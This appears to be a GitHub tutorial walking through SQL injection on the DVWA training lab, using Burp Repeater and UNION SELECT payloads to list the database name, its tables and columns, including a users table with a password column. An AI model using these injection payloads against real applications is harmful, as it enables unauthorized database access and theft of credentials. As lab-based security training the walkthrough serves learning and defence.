# SQL_Injection_DVWA

## Step 1
  In case you are planning to follow along, I would recommend to follow my intial steup guide. <br>
 [Click](https://github.com/EleniChristopoulou/DVWA_Initial_Setup-/tree/main) here to check it out.

 ## Step 2
  Now it is the time where we interact with site in order to discover actual functionality.<br>
  It is important to pay attention on the input and the output.<br>
  Head to `SQL Injection` tab.
<p align="center"><img width="420" height="300" alt="image" src="https://github.com/user-attachments/assets/f8b6d3cb-2f65-4cd0-805b-fe7f4cb9fe83" /> </p>

  So let's try out the value 1. Okay, we can see we have an output, trying out alll the value from 1-5 we can conclude that probably there are 5 users. <br> 
  When we submit a value that is above 5 we get no result.
  
<div align="center">

| ID | Result | User |
| :-----------: | :----------: | :----------: |
| 1 | <img width="180" height="100" alt="image" src="https://github.com/user-attachments/assets/8b1303ea-d01a-4470-849d-3396f57022af" /> | admin admin |
| 5 | <img width="180" height="100" alt="image" src="https://github.com/user-attachments/assets/5e43f551-a677-4d43-b6a7-1f1bbf70b2ee" /> | Bob Smith |
| 6 | <img width="180" height="100" alt="image" src="https://github.com/user-attachments/assets/5caf2470-5cdd-4141-b911-7c0e70a50bc3" /> | Does_Not_Exist |

</div>

## Step 3
  Now we are ready to initiate some logs. Back to our DVWA site on the `SQL Injection` tab we submit any type of value, our goal is just to see the log.

  Since I submited the value 1, I receive the respected query, within the id hold the value 1. By following the steps depicted within the picture, we have sent our log to the repeater tab in Burp. There will be able to forward and modify the request.
  <p align="center"><img width="500" height="360" alt="image" src="https://github.com/user-attachments/assets/c8a38567-f1d4-4523-b584-6219512e10a1" />
</p>

## Step 4
  This is the part where we experiement with our SQL injection queries. Our purpose is to extract various information regarding the database, tables their columns and the data they hold. <br>

  <div align="center">

| Code | Data Extracted Description | SQL Query | Result |
| :-----------: | :----------: | :----------: | :----------: |
| 1 | Name of the database | `' UNION SELECT null, database() #` | <img width="377" height="201" alt="image" src="https://github.com/user-attachments/assets/53605c50-efbf-48ba-81a3-8b4424422d91" /> |
| 2 | Based on the name of the database we get the tables | `' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='dvwa' #` | <img width="439" height="256" alt="image" src="https://github.com/user-attachments/assets/85ab4312-9743-4b7f-afc2-6d7ba70fe682" /> |
| 3 | Based on each table we get the columns  | `' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='guestbook' #` | <img width="426" height="282" alt="image" src="https://github.com/user-attachments/assets/8e1a7cd4-8fa0-44dd-bc86-c273ba1463e7" /> |

</div>

These are the tables and their columns.

- guestbook
   - comment_id 
   - comment
   - name

<div align="center">
  
| comment_id | comment | name |
| :-----------: | :----------: | :----------: | :----------: |
| 1 | This is a test comment. | test |
</div>

- users
   - user_id 
   - first_name
   - last_name
   - user 
   - password
   - avatar
   - last_login
   - failed_login
